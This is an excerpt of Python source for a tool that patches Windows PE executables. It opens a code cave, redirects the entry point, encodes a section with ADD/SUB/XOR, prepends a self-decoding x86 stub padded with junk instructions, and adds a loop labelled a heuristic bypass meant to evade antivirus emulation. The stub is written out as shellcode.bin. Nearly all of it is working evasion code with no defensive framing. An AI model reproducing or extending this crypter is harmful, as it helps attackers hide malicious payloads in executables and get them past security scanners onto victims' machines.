...
def get_section_header(pe, section_name):
	for section in pe.sections:
		if type(section_name.strip().lower()) == type(b""):
			if section_name.strip().lower() in section.Name.strip().lower():
				return section
		else:
			if section_name.strip().lower() in section.Name.strip().lower().decode("utf-8"):
				return section
...
def make_section_writeable(pe, name):
	for section in pe.sections:
		try:
			if name.strip().lower() in section.Name.strip().lower().decode("utf-8"):
...
def add_fill_instructions(limit):
	...
	filler_instructions = [
							...
							b"\x9c\x9d", 		# PUSHFD|POPFD
							b"\x40\x48",		 	# INC EAX|DEC EAX
							b"\x41\x49", 		# INC ECX|DEC ECX
							b"\x42\x4A", 		# INC EDX|DEC EDX
							b"\x43\x4B", 		# INC EBX|DEC EBX
							b"\x51\x31\xc9\x59",	# PUSH ECX|XOR ECX,ECX|POP ECX
							b"\x52\x31\xd2\x5a",	# PUSH EDX|XOR EDX,EDX|POP EDX
							b"\x53\x31\xdb\x5b"	# PUSH EBX|XOR EBX,EBX|POP EBX
						  ]
...
def build_decoder(pe, encoder, section, decode_start, decode_end):
	...
	'''
	decode_instructions = {
								"ADD":b"\x80\x28", # add encode w/ corresponding decoder ==> SUB BYTE PTR DS:[EAX] 
								"SUB":b"\x80\x00",	# sub encode w/ corresponding add decoder ==> ADD BYTE PTR DS:[EAX]
								"XOR":b"\x80\x30" # xor encode w/ corresponding xor decoder ==> XOR BYTE PTR DS:[EAX]
						   }
	...
	mov_instruct = b"\xb8" + decode_start # mov eax, decode_start
	decoder = mov_instruct + decoder  # prepend the decoder with the mov instruction 
	decoder += b"\x40" # inc eax
	decoder += b"\x3d" + decode_end # cmp eax, decode_end
	...
	decoder += b"\x7c" + back_jump_value # jl, start_of_decode 
	decoder += b"\x90\x90" # NOPS
...
'''		
def retrieve_data(pe:pefile.PE, section_name, type):
	try:
		section_header = get_section_header(pe, section_name)
	...
	if type == "raw":
		...
		section_stop=section_start+section_header.Misc_VirtualSize
	data = binascii.hexlify(pe.get_memory_mapped_image()[section_start:section_stop]).decode()
	data = re.findall(r'.{1,2}',data,re.DOTALL)
	return data
		...
		if len(sections) > 0:
			for section in sections:	
				...
				if section:
					...
					#print(section_header.VirtualAddress)
					#print(section_start + encode_offset)
...
def modify_entry_instructions(ep_ava, original_instructions, heuristic_decoder_offset, code_cave_address):
	updated_instructions = b"" # holds the modified data
	...
	for i in md.disasm(original_instructions,ep_ava):
		...
		#print(instruct_bytes[0].to_bytes(length=1, byteorder='little', signed=False))
		opcode = binascii.hexlify(instruct_bytes[0].to_bytes(length=1, byteorder='little', signed=False)) # extract first opcode byte
...
def build_new_entry_jump(current_address, new_entry_address):
	...
	if new_entry_address < current_address:
		...
		jmp_instruction = b"\xe9" + struct.pack("=l", new_entry_loc)
	else:
...
def generate_heuristic(loop_limit):
	...
	heuristic = b""
	heuristic += b"\x33\xC0"  														# XOR EAX,EAX
	heuristic += add_fill_instructions(fill_limit)									# fill
	heuristic += b"\x40"   															# INC EAX
	heuristic += add_fill_instructions(fill_limit)									# fill
	heuristic += b"\x3D" + struct.pack("=L", loop_limit)  							# CMP EAX,loop_limit
	short_jump = binascii.unhexlify(format((1 << 16) - (len(heuristic)), 'x')[2:])  # Jump immediately after XOR EAX,EAX
	heuristic += b"\x75" + short_jump   											    # JNZ SHORT 
	heuristic += add_fill_instructions(fill_limit)									# fill
	heuristic += b"\x90\x90\x90"   													# NOP
	return heuristic
...
def build_heuristic_bypass(heuristic_iterations):
	...
	heuristic_start = b"\x90\x90\x90\x90\x90\x90" # XOR ESI,ESI
	heuristic_start += b"\x31\xf6"   			 # XOR ESI,ESI
	heuristic_start += b"\x31\xff"   			 # XOR EDI,EDI
...
'''	
def write_codecave(pe:pefile.PE, code_cave_section, code_cave_raw_offset, heuristic_bypass, decoder, modified_entry_instructions, restore_execution_flow):
...
#	code_cave_jump = b"\xe8" + code_cave_virtual_offset # generate jump instruction to code cave
...
#		pe.set_bytes_at_offset(jmp_overwrite_location+len(code_cave_jump), b"\x90" * (len(saved_entry_instructions) - len(code_cave_jump)))
...
#	write_codecave(pe, code_cave_section, code_cave_raw_offset, heuristic_bypass, decoder, modified_entry_instructions, restore_execution_flow)
	save_regs = b"\x56\x57\x53\x56"  #push esi, push edi, push ebx, push esi
	recover_esi = b"\x5e"  #pop esi
	code = save_regs + heuristic_bypass + decoder + recover_esi + b'\xc3' #add retn
	shellcode = open("shellcode.bin", "wb")
	shellcode.write(code)
	shellcode.flush()
	shellcode.close()
